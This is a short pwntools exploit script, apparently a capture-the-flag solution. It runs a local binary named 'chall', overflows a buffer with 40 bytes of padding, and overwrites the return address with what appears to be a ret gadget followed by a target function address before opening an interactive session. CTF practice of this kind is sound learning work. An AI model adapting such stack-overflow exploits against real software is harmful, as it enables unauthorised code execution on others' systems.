from pwn import * 
p = process("./chall") 

gdb.attach(p)
p.sendline(b"A"*(32+8) + p64(0x000000000040101a) + p64(0x0000000000401176))

p.interactive() 